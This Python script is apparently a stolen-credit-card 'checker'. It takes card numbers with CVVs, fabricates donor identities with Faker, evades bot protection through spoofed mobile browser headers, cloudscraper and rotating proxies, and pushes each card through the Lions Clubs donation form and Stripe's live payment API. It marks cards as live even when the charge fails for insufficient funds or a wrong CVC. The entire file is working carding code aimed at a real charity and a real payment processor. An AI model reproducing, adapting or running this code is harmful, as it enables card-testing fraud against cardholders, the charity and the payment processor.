import time
import json
import base64
from faker import Faker
from curl_cffi import requests as curl_requests
import cloudscraper
from proxy_manager import get_random_proxy

fake = Faker('en_US')

def get_proxy_dict():
    proxy = get_random_proxy()
    if proxy:
        return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
    return None

scraper = cloudscraper.create_scraper(
    interpreter='js2py',
    delay=5,
    browser={
        'browser': 'chrome',
        'platform': 'ios',
        'mobile': True
    }
)

def check_card(card_data: str) -> dict:
    try:
        cards = card_data.strip().split('|')
        if len(cards) != 4:
            return {
                'card': card_data,
                'status': 'INVALID',
                'message': 'Invalid format. Use: XXXX|MM|YY|CVV',
                'approved': False
            }
        
        cc_number = cards[0]
        cc_month = cards[1]
        cc_year = cards[2][-2:] if len(cards[2]) == 4 else cards[2]
        cc_cvv = cards[3]
        
        first_name = fake.first_name()
        last_name = fake.last_name()
        email = fake.email()
        phone = fake.numerify('##########')
        street = fake.street_address()
        city = fake.city()
        state = fake.state()
        zipcode = fake.zipcode()
        
        headers_m = {
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
            'Content-Type': 'text/plain',
            'sec-ch-ua': '"Chromium";v="124", "Brave";v="124", "Not-A.Brand";v="99"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-mobile': '?1',
            'origin': 'https://m.stripe.network',
            'referer': 'https://m.stripe.network/',
        }
        
        payload_m = "JTdCJTIydjIlMjIlM0ExJTJDJTIyaWQlMjIlM0ElMjJkODVlNThhNmQwOTRlMzViMTExODI3YWY1Yjc0ZjE5NSUyMiUyQyUyMnQlMjIlM0E2MCUyQyUyMnRhZyUyMiUzQSUyMjQuNS40MyUyMiUyQyUyMnNyYyUyMiUzQSUyMmpzJTIyJTJDJTIyYSUyMiUzQSU3QiUyMmElMjIlM0ElN0IlMjJ2JTIyJTNBJTIyZmFsc2UlMjIlMkMlMjJ0JTIyJTNBMCU3RCUyQyUyMmIlMjIlM0ElN0IlMjJ2JTIyJTNBJTIyZmFsc2UlMjIlMkMlMjJ0JTIyJTNBMCU3RCUyQyUyMmMlMjIlM0ElN0IlMjJ2JTIyJTNBJTIyZW4tQ0ElMjIlMkMlMjJ0JTIyJTNBMCU3RCUyQyUyMmQlMjIlM0ElN0IlMjJ2JTIyJTNBJTIyaVBob25lJTIyJTJDJTIydCUyMiUzQTAlN0QlMkMlMjJlJTIyJTNBJTdCJTIydiUyMiUzQSUyMk1vemlsbGElMkY1LjAlMjAoaVBob25lJTNCJTIwQ1BVJTIwaVBob25lJTIwT1MlMjAxNl80XzElMjBsaWtlJTIwTWFjJTIwT1MlMjBYKSUyMEFwcGxlV2ViS2l0JTJGNjA1LjEuMTUlMjAoS0hUTUwlMkMlMjBsaWtlJTIwR2Vja28pJTIwVmVyc2lvbiUyRjE2LjQlMjBNb2JpbGUlMkYxNUUxNDglMjBTYWZhcmklMkY2MDQuMSUyMiUyQyUyMnQlMjIlM0EwJTdEJTdEJTdE"
        
        r1 = curl_requests.post('https://m.stripe.com/6', data=payload_m, headers=headers_m, timeout=30)
        stripe_data = r1.json()
        muid = stripe_data.get('muid', '')
        sid = stripe_data.get('sid', '')
        guid = stripe_data.get('guid', '')
        
        if not muid or not sid:
            return {
                'card': card_data,
                'status': 'ERROR',
                'message': 'Failed to get Stripe session',
                'approved': False
            }
        
        trigger_time = str(int(time.time() * 1000))
        
        headers_ajax = {
            'Host': 'www.lionsclubs.org',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'X-Requested-With': 'XMLHttpRequest',
            'Sec-Fetch-Site': 'same-origin',
            'Accept-Language': 'en-GB,en;q=0.9',
            'Sec-Fetch-Mode': 'cors',
            'Origin': 'https://www.lionsclubs.org',
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1',
            'Referer': 'https://www.lionsclubs.org/en/donate?err=donation_error',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Cookie': f'nav=public; __stripe_mid={muid}; __stripe_sid={sid}'
        }
        
        form_data = {
            'campaign': '1',
            'is_this_a_recurring_gift_': 'One-Time-Gift',
            'how_much_would_you_like_to_donate_': '20',
            'donate_amount': '',
            'who_is_this_gift_from_': 'lion',
            'business_name': '',
            'club_or_district_name': '',
            'club_or_district_id': '',
            'first_name': first_name,
            'last_name': last_name,
            'email_address_2': email,
            'phone_number_optional': phone,
            'address[address]': street,
            'address[address_2]': '',
            'address[postal_code]': zipcode,
            'address[city]': city,
            'address[country]': 'United States',
            'address[state_province]': state,
            'address_provinces_canada': '',
            'address_states_india': '',
            'sponsoring_lions_club_name': '',
            'sponsoring_lions_club_id': '',
            'club_name': first_name,
            'club_id': '',
            'member_id_optional_': '',
            'is_this_an_anonymous_gift_': 'no',
            'recognition_request': 'no recognition',
            'recognition_name': '',
            'recognition_plaque_display': '',
            'recognition_club_name': '',
            'recognition_member_id': '',
            'recognition_message': '',
            'special_instructions': '',
            'recognition_shipping_first_name': '',
            'recognition_shipping_last_name': '',
            'recognition_shipping_phone': '',
            'recognition_shipping_address[address]': '',
            'recognition_shipping_address[address_2]': '',
            'recognition_shipping_address[postal_code]': '',
            'recognition_shipping_address[city]': '',
            'recognition_shipping_address[country]': '',
            'recognition_shipping_address[state_province]': '',
            'shipping_address_provinces_in_canada': '',
            'shipping_address_states_india': '',
            'recognition_shipping_comments': '',
            'how_would_you_like_to_pay_': 'credit-card',
            'name_on_card': f'{first_name} {last_name}',
            'stripe_card[payment_intent]': '',
            'stripe_card[client_secret]': '',
            'stripe_card[trigger]': trigger_time,
            'leave_this_field_blank': '',
            'url_redirection': '',
            'form_build_id': 'form-2UMZdaTcjTaNM41oDtYO-53ncn-QYLw8nwnsP1vjY4o',
            'form_id': 'webform_submission_donation_paragraph_34856_add_form',
            'antibot_key': 'B7N6p5OEzhElwYbQ63su_hzatGXEpYwx7fLMuSVftNs',
            'form_instance_id': '67f428e93f2d3',
            '_triggering_element_name': 'stripe-stripe_card-button',
            '_triggering_element_value': 'Update',
            '_drupal_ajax': '1',
            'ajax_page_state[theme]': 'lionsclubs',
            'ajax_page_state[theme_token]': '',
            'ajax_page_state[libraries]': 'eJyFUFtywyAMvBAxR2IElgmpjKgk0uT2xeM0bZNm-qPHrp4L1Upk87D7aWFZXUQzlICXxopzWAqNVH3GigLk0hvOxVgCpMQyF67-Hk2LcDWss0tMLJEvfsYFOtkdCKVSqegf8sEL-jKapQJNp_eOct3vSV2N15Cox0CcYOz2f2AuM2fCYJB9HuYxn-AEl9_g6mgcrUGZJCiCpKP_Ed_YcxHrQCFxPeMQajxMqRzUpDQ8nHQv204ZIhHHoVEDgSzQjupn6W089I1MvbYeqegRZ7cvCtBKgG6ceG2Ehv4F7valfndOr2q4-giKzmJYMcOKtT8DaldCdR8YN0X9zU_bWNYy5j4ySDgabZrRoJBOCuf_i4zz0PZl2YqqkF_z3DZtn6_84nUEyZ7ozXwCj_UYIQ',
        }
        
        r2 = curl_requests.post(
            'https://www.lionsclubs.org/en/donate?ajax_form=1&_wrapper_format=drupal_ajax',
            data=form_data,
            headers=headers_ajax,
            timeout=30,
            impersonate="safari_ios"
        )
        
        if 'payment_intent' not in r2.text:
            return {
                'card': card_data,
                'status': 'DECLINED',
                'message': 'Failed to create payment intent',
                'approved': False
            }
        
        payment_intent = r2.text.split('"payment_intent":')[1].split('"')[1]
        
        cookie_str = ''
        try:
            cookies_raw = str(r2.cookies)
            if '<Cookie ' in cookies_raw:
                cookie_str = cookies_raw.split(' for ')[0].split('<Cookie ')[1]
        except:
            pass
        
        headers_pm = {
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://js.stripe.com',
            'Referer': 'https://js.stripe.com/',
        }
        
        pm_payload = f'type=card&card[number]={cc_number}&card[cvc]={cc_cvv}&card[exp_month]={cc_month}&card[exp_year]={cc_year}&guid={guid}&muid={muid}&sid={sid}&pasted_fields=number&payment_user_agent=stripe.js%2Ff28ec4bf5e%3B+stripe-js-v3%2Ff28ec4bf5e%3B+card-element&referrer=https%3A%2F%2Fwww.lionsclubs.org&time_on_page=97333&key=pk_live_gaSDC8QsAaou2vzZP59yJ8S5'
        
        proxy = get_proxy_dict()
        r3 = curl_requests.post('https://api.stripe.com/v1/payment_methods', data=pm_payload, headers=headers_pm, timeout=30, proxies=proxy)
        
        if 'error' in r3.text:
            error_msg = r3.json().get('error', {}).get('message', 'Card declined')
            return {
                'card': card_data,
                'status': 'DECLINED',
                'message': error_msg,
                'approved': False
            }
        
        if 'pm_' not in r3.text:
            return {
                'card': card_data,
                'status': 'DECLINED',
                'message': 'Failed to create payment method',
                'approved': False
            }
        
        pm_id = r3.json().get('id')
        
        headers_method = {
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'Origin': 'https://www.lionsclubs.org',
            'Referer': 'https://www.lionsclubs.org/en/donate',
            'Cookie': f'__stripe_mid={muid}; __stripe_sid={sid}; {cookie_str}',
        }
        
        method_payload = json.dumps({
            'paymentMethodId': pm_id,
            'paymentintent': payment_intent,
            'currentPath': '/node/13261'
        })
        
        r4 = curl_requests.post('https://www.lionsclubs.org/lions_payment/method_id', data=method_payload, headers=headers_method, timeout=30, impersonate="safari")
        
        if 'clientSecretKey' not in r4.text:
            return {
                'card': card_data,
                'status': 'DECLINED',
                'message': 'Failed to get client secret',
                'approved': False
            }
        
        client_secret = r4.json().get('clientSecretKey')
        
        headers_confirm = {
            'Host': 'api.stripe.com',
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://js.stripe.com',
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
            'Referer': 'https://js.stripe.com/',
        }
        
        confirm_payload = f'payment_method={pm_id}&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_gaSDC8QsAaou2vzZP59yJ8S5&client_secret={client_secret}'
        
        r5 = curl_requests.post(f'https://api.stripe.com/v1/payment_intents/{payment_intent}/confirm', data=confirm_payload, headers=headers_confirm, timeout=30, proxies=proxy)
        
        result = r5.json()
        status = result.get('status', '')
        
        if status == 'succeeded':
            return {
                'card': card_data,
                'status': 'APPROVED',
                'message': 'authenticate successful',
                'approved': True
            }
        elif status == 'requires_action' or status == 'requires_source_action':
            return {
                'card': card_data,
                'status': 'APPROVED',
                'message': 'challenge required',
                'approved': True
            }
        elif 'error' in result:
            error_msg = result.get('error', {}).get('message', 'Card declined')
            decline_code = result.get('error', {}).get('decline_code', '')
            
            if 'insufficient_funds' in error_msg.lower() or decline_code == 'insufficient_funds':
                return {
                    'card': card_data,
                    'status': 'APPROVED',
                    'message': 'attempt successful',
                    'approved': True
                }
            elif 'cvc' in error_msg.lower() or 'cvv' in error_msg.lower() or decline_code == 'incorrect_cvc':
                return {
                    'card': card_data,
                    'status': 'APPROVED',
                    'message': 'attempt successful',
                    'approved': True
                }
            
            return {
                'card': card_data,
                'status': 'DECLINED',
                'message': 'lookup error',
                'approved': False
            }
        else:
            return {
                'card': card_data,
                'status': 'DECLINED',
                'message': 'lookup error',
                'approved': False
            }
            
    except Exception as e:
        return {
            'card': card_data,
            'status': 'ERROR',
            'message': str(e)[:100],
            'approved': False
        }
